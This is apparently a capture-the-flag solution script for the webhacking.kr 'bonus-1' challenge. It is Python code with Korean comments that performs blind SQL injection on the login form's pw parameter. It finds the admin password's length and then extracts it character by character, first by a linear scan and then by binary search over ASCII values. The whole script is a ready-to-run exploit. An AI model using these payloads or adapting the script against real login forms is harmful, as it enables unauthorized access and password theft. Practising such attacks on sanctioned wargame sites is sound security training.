from pytest import param
import requests

url = "https://webhacking.kr/challenge/bonus-1/index.php"
TRUE_FLAG = 'wrong password'
params = {
    'id' : 'admin',
    'pw' : ''
}

def get_password_length():
    for i in range(1,100):
        payload = "' or length(pw) = {} and id='admin' -- ".format(str(i))
        params['pw'] = payload
        response = requests.get(url,params=params)
        
        if('wrong password' in response.text):
            print("find password length" + str(i))
            return i

password_length = get_password_length()

#1. 단순 반복문을 통해서 비밀번호를 구한 경우
def get_password1(password_length):
    count = 0
    password = ''
    for i in range(1,password_length+1):
        for j in range(32,127):
            payload = "' or id='admin' and ascii(substr(pw,{},1)) = {}-- ".format(i,j)
            params['pw'] = payload
            response = requests.get(url,params=params)
            if(TRUE_FLAG in response.text):
                password += chr(j)
                print(password)
            count +=1
    print("총 쿼리문 동작 횟수 : "+ str(count))
    return password

get_password1(password_length)

# 2. Binary Search 알고리즘을 이용해서 비밀번호를 구한 경우
def get_password2(password_length):
    password = ''
    count = 0
    for i in range(1,password_length+1):
        left,right = 32,127 
        while(1):
            search = int((left + right)/2)
#            print(search)
            injection_string = "' or id='admin' and ascii(substr(pw,{},1)) < {}--  ".format(i,search)
            params['pw'] = injection_string
            response = requests.get(url,params=params)
            # 위의 식이 틀렸다는 말이니까 search를 더 크게 만들어야 한다. left를 바꾼다
            if('login fail' in response.text):
                left = int((left + right)/2)
            else:
                right = int((left + right)/2)
            
            if(left == right):
                print(chr(left))
                password += chr(left)
                break
            if(left == (right -1)):
                injection_string = "' or id='admin' and ascii(substr(pw,{},1)) = {}--  ".format(i,left)
                params['pw'] = injection_string
                response = requests.get(url,params=params)
                if('login fail' in response.text):
                    print(chr(right))
                    password +=chr(right)
                    break
                else:
                    print(chr(left))
                    password +=chr(left)
                    break
            count = count+1
    print("총 쿼리문 동작 횟수 : "+ str(count))
    return password

get_password2(password_length)

